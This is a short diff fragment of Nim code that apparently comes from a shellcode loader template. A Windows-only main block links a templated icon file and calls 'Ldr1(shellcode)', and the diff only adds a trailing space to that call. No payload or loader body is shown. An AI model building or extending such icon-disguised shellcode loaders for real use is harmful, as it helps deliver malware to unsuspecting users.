@@ -49,4 +49,4 @@ when defined(windows):
 
     when isMainModule:
         {.link: "icon/{{ICON}}".}
-        Ldr1(shellcode)
+        Ldr1(shellcode) 
